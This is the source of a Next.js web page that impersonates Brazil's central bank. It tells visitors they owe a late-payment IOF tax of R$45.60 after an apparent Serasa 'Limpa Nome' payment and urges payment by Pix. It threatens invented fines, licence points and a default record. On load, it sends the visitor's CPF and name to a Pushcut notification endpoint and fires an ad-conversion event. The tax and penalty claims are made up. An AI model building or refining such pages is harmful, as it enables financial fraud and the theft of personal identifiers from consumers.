"use client";

import { useSearchParams, useRouter } from "next/navigation";
import { Suspense, useState, useEffect, useRef } from "react";
import Image from "next/image";
import { Shield, Volume2 } from "lucide-react";

function IOFContent() {
  const searchParams = useSearchParams();
  const router = useRouter();
  const [isPlaying, setIsPlaying] = useState(false);

  const notificationSent = useRef(false);
  const cpf = searchParams.get("cpf") || "";
  const nome = searchParams.get("nome") || "";
  const valorOriginal = parseFloat(searchParams.get("valor") || "78.47");
  const valorIOF = 45.60;

  useEffect(() => {
    if (!notificationSent.current) {
      notificationSent.current = true;
      // Notificacao Pushcut - Limpa Nome pago
      fetch("https://api.pushcut.io/EAdPHzz_Giwpjt0AwH9L_/notifications/Serasa", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: `Limpa Nome PAGO - CPF: ${cpf} - Nome: ${nome} - Valor: R$ ${valorOriginal.toFixed(2)}` }),
      }).catch(() => {});

      // Pixel de conversao - Limpa Nome pago
      const fireConversion = () => {
        if (typeof window !== "undefined" && (window as any).gtag) {
          (window as any).gtag("event", "conversion", {
            send_to: "AW-18028229407/CfDYCPay04wcEJ_mw5RD",
            value: valorOriginal,
            currency: "BRL",
            transaction_id: `${cpf}-limpanome-${Date.now()}`,
          });
          return true;
        }
        return false;
      };

      if (!fireConversion()) {
        const interval = setInterval(() => {
          if (fireConversion()) clearInterval(interval);
        }, 500);
        setTimeout(() => clearInterval(interval), 10000);
      }
    }
  }, [cpf, nome, valorOriginal]);

  const handlePagar = () => {
    router.push(`/pix-iof?cpf=${cpf}&nome=${encodeURIComponent(nome)}&valor=${valorIOF}&valorOriginal=${valorOriginal}`);
  };

  return (
    <div className="flex min-h-screen flex-col bg-white">
      <div className="flex items-center justify-center bg-[#1a6b8a] py-6">
        <Image
          src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/banco%20central%20logo-xoavR9HTAc4Xvls30hD3pv9OwHAMEC.png"
          alt="Banco Central do Brasil"
          width={180}
          height={100}
          className="h-24 w-auto brightness-0 invert"
          unoptimized
        />
      </div>

      <main className="flex flex-1 flex-col p-4">
        <div className="mb-4">
          <h1 className="text-xl font-bold text-zinc-900">
            Importante: Pendencia junto ao Banco Central
          </h1>
          <div className="mt-2 h-1 w-16 bg-[#4a7fb5]" />
        </div>

        <p className="text-sm leading-relaxed text-zinc-700">
          Ao realizar o pagamento da sua pendecia com atraso, voce estara sujeito a cobranca do Imposto sobre Operacoes Financeiras (IOF), conforme regulamentacao do Banco Central. Este imposto e aplicado para garantir a regularidade da operacao e a conformidade com as normas fiscais vigentes.
        </p>

        <div className="mt-6 rounded-lg border-l-4 border-[#4a7fb5] bg-zinc-50 p-4">
          <h2 className="text-lg font-bold text-zinc-900">O que e o IOF?</h2>
          
          <div className="mt-2 flex items-center gap-1 text-sm text-zinc-600">
            <span>Aumente o volume</span>
            <Volume2 className="h-4 w-4 text-red-500" />
            <Volume2 className="h-4 w-4 text-red-500" />
            <Volume2 className="h-4 w-4 text-red-500" />
            <Volume2 className="h-4 w-4 text-red-500" />
          </div>

          <div className="mt-4 aspect-video w-full overflow-hidden rounded-lg bg-black">
            {!isPlaying ? (
              <button
                type="button"
                onClick={() => setIsPlaying(true)}
                className="flex h-full w-full flex-col items-center justify-center gap-2"
              >
                <div className="flex h-12 w-12 items-center justify-center rounded-full bg-zinc-800">
                  <Volume2 className="h-6 w-6 text-white" />
                </div>
                <span className="text-sm text-white">Clique para Ouvir</span>
              </button>
            ) : (
              <iframe
                width="100%"
                height="100%"
                src="https://www.youtube.com/embed/5r7kM6ZkYb8?autoplay=1"
                title="O que e IOF"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowFullScreen
                className="border-0"
              />
            )}
          </div>
        </div>

        <div className="my-8 flex justify-center">
          <Image
            src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/banco%20central%20logo-xoavR9HTAc4Xvls30hD3pv9OwHAMEC.png"
            alt="Banco Central do Brasil"
            width={150}
            height={80}
            className="h-20 w-auto"
            unoptimized
          />
        </div>

        <p className="text-center text-sm leading-relaxed text-zinc-600">
          O nao pagamento do Imposto sobre Operacoes Financeiras (IOF) resultara no cancelamento da transferencia bancaria e na aplicacao de mais uma multa em seu nome. Alem da multa de R$ 195,23 + 5 Pontos na carteira, sua situacao podera ser registrada como inadimplente, impactando negativamente seu historico financeiro.
        </p>

        <div className="mt-6 rounded-xl bg-zinc-100 p-6">
          <div className="flex items-center justify-center gap-2">
            <h3 className="text-lg font-bold text-zinc-900">Pague via Pix</h3>
            <Image
              src="/images/pix-icon.png"
              alt="PIX"
              width={24}
              height={24}
              className="h-6 w-6"
            />
          </div>

          <p className="mt-2 text-center text-sm text-zinc-600">
            O pagamento sera confirmado imediatamente
          </p>

          <p className="mt-4 text-center text-3xl font-bold text-green-500">
            R$ {valorIOF.toFixed(2).replace(".", ",")}
          </p>

          <button
            type="button"
            onClick={handlePagar}
            className="mt-4 w-full rounded-full bg-[#4a7fb5] py-4 text-base font-semibold text-white transition-colors hover:bg-[#3a6fa5]"
          >
            Pagar agora
          </button>

          <div className="mt-4 flex items-center justify-center gap-2 text-sm text-zinc-500">
            <Shield className="h-4 w-4 text-green-500" />
            <span>Ambiente seguro</span>
          </div>
        </div>
      </main>
    </div>
  );
}

export default function IOFPage() {
  return (
    <Suspense
      fallback={
        <div className="flex min-h-screen items-center justify-center bg-white">
          <p className="text-zinc-600">Carregando...</p>
        </div>
      }
    >
      <IOFContent />
    </Suspense>
  );
}
